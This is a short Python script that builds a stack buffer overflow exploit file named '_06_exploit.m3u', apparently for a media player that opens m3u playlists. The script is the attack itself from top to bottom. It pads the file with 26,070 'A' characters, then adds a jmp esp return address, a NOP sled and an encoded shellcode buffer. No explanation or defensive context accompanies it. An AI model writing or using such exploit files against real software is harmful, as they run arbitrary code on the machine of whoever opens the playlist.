import struct
#kernel32.dll jmp esp using fndjump.exe

jmpesp = struct.pack('<I', 0x01d5023f)

nops = "\x90" * 25

buf =  b""
buf += b"\xd9\xea\xb8\x56\x99\xa2\x8c\xd9\x74\x24\xf4\x5a\x2b"
buf += b"\xc9\xb1\x30\x31\x42\x18\x03\x42\x18\x83\xea\xaa\x7b"
buf += b"\x57\x70\xba\xfe\x98\x89\x3a\x9f\x11\x6c\x0b\x9f\x46"
buf += b"\xe4\x3b\x2f\x0c\xa8\xb7\xc4\x40\x59\x4c\xa8\x4c\x6e"
buf += b"\xe5\x07\xab\x41\xf6\x34\x8f\xc0\x74\x47\xdc\x22\x45"
buf += b"\x88\x11\x22\x82\xf5\xd8\x76\x5b\x71\x4e\x67\xe8\xcf"
buf += b"\x53\x0c\xa2\xde\xd3\xf1\x72\xe0\xf2\xa7\x09\xbb\xd4"
buf += b"\x46\xde\xb7\x5c\x51\x03\xfd\x17\xea\xf7\x89\xa9\x3a"
buf += b"\xc6\x72\x05\x03\xe7\x80\x57\x43\xcf\x7a\x22\xbd\x2c"
buf += b"\x06\x35\x7a\x4f\xdc\xb0\x99\xf7\x97\x63\x46\x06\x7b"
buf += b"\xf5\x0d\x04\x30\x71\x49\x08\xc7\x56\xe1\x34\x4c\x59"
buf += b"\x26\xbd\x16\x7e\xe2\xe6\xcd\x1f\xb3\x42\xa3\x20\xa3"
buf += b"\x2d\x1c\x85\xaf\xc3\x49\xb4\xed\x89\x8c\x4a\x88\xff"
buf += b"\x8f\x54\x93\xaf\xe7\x65\x18\x20\x7f\x7a\xcb\x05\x8f"
buf += b"\x30\x56\x2f\x18\x9d\x02\x72\x45\x1e\xf9\xb0\x70\x9d"
buf += b"\x08\x48\x87\xbd\x78\x4d\xc3\x79\x90\x3f\x5c\xec\x96"
buf += b"\xec\x5d\x25\xf5\x73\xce\xa5\xfa"



buffer = "A"*26070+jmpesp+nops+buf

try:
        fl = open("_06_exploit.m3u","w")
        fl.write(buffer)
        fl.close()
except:
        print "failed"
